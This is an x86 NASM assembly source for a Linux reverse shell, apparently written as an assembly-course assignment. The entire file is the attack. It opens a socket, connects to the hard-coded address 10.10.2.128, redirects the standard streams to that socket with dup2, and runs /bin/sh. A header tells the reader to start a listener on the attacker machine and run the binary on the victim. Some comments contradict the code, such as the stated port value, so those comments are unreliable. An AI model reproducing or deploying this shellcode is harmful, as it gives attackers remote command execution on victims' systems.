; Program 	: reverse-shell.nasm 

; Usage 	: First start listener on attacker machine &
;	  	  then run ./reverse-shell on victim machine

; Compilation   : ./execute.sh reverse-shell

; Github repo: https://github.com/jayeshchm/SLAE-Assignments

global _start

section .text

	_start:
		
		; socket syscall

		sub eax , eax		; 
		sub ebx , ebx		; 
		cdq

		inc bl			; socketcall 1st arg
		push eax		; 0 
		push ebx		; 1 SOCK_STREAM
		push byte 0x2		; 2 PF_INET

		mov ecx , esp		; socketcall 2nd arg
		mov al , 0x66		; socketcall syscall no
		int 0x80		; informs kernel for execution
		mov esi , eax		; return address

		;------------------------------------------------------------;
		; eax=0x66 , ebx=0x1 , ecx=address , edx=0 , esi=fd	     ;	     
		;------------------------------------------------------------;
		
		; connect syscall

		push long 0x80020a0a 	; 10.10.2.128 in reverse order 
		push word 0xd204	; binding port -> 0xdead = 48059 -> little endian 
		inc bl 			; 
		push word bx		; AF_INET
		
		mov ecx , esp		; struct sockaddr_in address
		
		push byte 0x10		; addrlen
		push ecx		; pointer to struct sockaddr
		push esi		; socket descriptor
		
		mov al , 0x66		; socketcall syscall no
		inc bl			; SYS_CONNECT=0x3
		mov ecx , esp		; 2nd arg of socketcall
		int 0x80		; informs kernel for execution

		;------------------------------------------------------------;
		; eax=0x66 , ebx=0x3 , ecx=address , edx=0 , esi=fd          ;
		;------------------------------------------------------------;

		; dup2 null, stderr, stdout

		sub ecx , ecx
		
		dup2Loop:
				
			mov al , 0x3f	; dup2 syscall no
			mov ebx , esi	; socket descriptor
			cmp cl , 0x1	; cl=0 duplicates NULL
			int 0x80
			inc cl
			jns dup2Loop

		;------------------------------------------------------------;
		; edx=0 						     ;
		;------------------------------------------------------------;
		
		; execve syscall
		
		mov al , 0xb		; execve syscall no
		push edx		; NULL
		push dword 0x68732f2f	; hs// in stack
		push dword 0x6e69622f	; nib/ in stack

		mov ebx , esp		; address of NULL terminated /bin/sh
		mov ecx , edx		; NULL
		int 0x80		; informs kernel
